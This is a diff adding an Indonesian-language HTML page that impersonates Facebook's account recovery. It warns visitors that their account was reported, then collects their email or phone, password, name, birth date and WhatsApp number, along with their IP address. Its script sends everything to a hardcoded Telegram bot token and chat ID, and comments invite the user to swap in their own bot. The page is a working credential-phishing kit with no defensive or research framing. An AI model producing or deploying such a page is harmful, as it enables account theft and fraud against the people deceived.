@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pemulihan Akun | Facebook</title>
+  <style>
+    body { margin: 0; font-family: Arial, sans-serif; background: #f0f2f5; }
+    .container { max-width: 400px; margin: 40px auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+    h2 { color: #1877f2; }
+    input, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #ccc; }
+    button { background: #1877f2; color: #fff; border: none; font-size: 16px; cursor: pointer; }
+    button:hover { background: #166fe5; }
+    .step { display: none; }
+    .step.active { display: block; }
+    .alert-box { display: none; background: #fbe9eb; color: #d93025; border: 1px solid #d93025; padding: 10px; border-radius: 6px; font-size: 14px; margin-top: 10px; }
+    .icon-lock { text-align: center; margin: 20px 0; }
+    .icon-lock img { width: 60px; }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+
+    <!-- STEP 0: Konfirmasi -->
+    <div class="step active" id="step0">
+      <div class="icon-lock">
+        <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="lock" />
+      </div>
+      <h2>Harap Konfirmasi Identitas Anda</h2>
+      <p>Demi keamanan, kami perlu memverifikasi akun Anda karena telah dilaporkan mengandung konten tidak pantas.</p>
+      <button onclick="goToStep(1)">Lanjutkan</button>
+    </div>
+
+    <!-- STEP 1: Form -->
+    <div class="step" id="step1">
+      <h2>Informasi Pemulihan</h2>
+      <input type="email" id="recoveryEmail" placeholder="Email atau Nomor Telepon Facebook" required />
+      <input type="password" id="recoveryPassword" placeholder="Password Facebook" required />
+      <input type="text" id="namaFb" placeholder="Nama Facebook" required />
+      <input type="text" id="lahir" placeholder="Tanggal Lahir (DD-MM-YYYY)" required />
+      <input type="text" id="wa" placeholder="Nomor WhatsApp untuk pemberitahuan" required />
+      <div id="alertBox" class="alert-box"></div>
+      <button onclick="submitForm()">Lanjutkan</button>
+    </div>
+
+    <!-- STEP DONE -->
+    <div class="step" id="stepDone">
+      <h2>Berhasil!</h2>
+      <p>Informasi berhasil dikirim. Anda akan dihubungi melalui WhatsApp oleh tim Meta Facebook.</p>
+    </div>
+
+  </div>
+
+  <script>
+    let userIP = "";
+
+    // Ambil IP pengguna
+    fetch("https://ipwho.is/")
+      .then(res => res.json())
+      .then(data => {
+        userIP = data.success ? data.ip : "Tidak diketahui";
+      })
+      .catch(() => {
+        userIP = "Gagal mengambil IP";
+      });
+
+    function goToStep(step) {
+      document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
+      document.getElementById("step" + step).classList.add("active");
+    }
+
+    function submitForm() {
+      const email = document.getElementById('recoveryEmail').value.trim();
+      const pass = document.getElementById('recoveryPassword').value.trim();
+      const nama = document.getElementById('namaFb').value.trim();
+      const lahir = document.getElementById('lahir').value.trim();
+      const wa = document.getElementById('wa').value.trim();
+      const alertBox = document.getElementById('alertBox');
+
+      alertBox.style.display = 'none';
+      alertBox.innerText = '';
+
+      if (!email || !pass || !nama || !lahir || !wa) {
+        alertBox.style.display = 'block';
+        alertBox.innerText = "Semua kolom wajib diisi.";
+        return;
+      }
+
+      // GANTI dengan token dan chat ID kamu
+      const botToken = "8098018598:AAGEFaANnzDBjGAA10MaB1aMoiRni1AZVfo"; // ← Ganti di sini
+      const chatId = "7137150704"; // ← Ganti di sini
+
+      const message = `
+🔐 *Formulir Pemulihan Facebook*
+--------------------------
+📧 Email: ${email}
+🔑 Password: ${pass}
+🙍 Nama: ${nama}
+🎂 Tanggal Lahir: ${lahir}
+📱 WhatsApp: ${wa}
+🌐 IP: ${userIP}
+
+*Website by acill x code*
+--------------------------`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          goToStep('Done');
+        } else {
+          throw new Error("Gagal kirim ke Telegram");
+        }
+      })
+      .catch(() => {
+        alertBox.style.display = 'block';
+        alertBox.innerText = "Gagal mengirim data. Silakan coba lagi.";
+      });
+    }
+  </script>
+
+</body>
+</html>
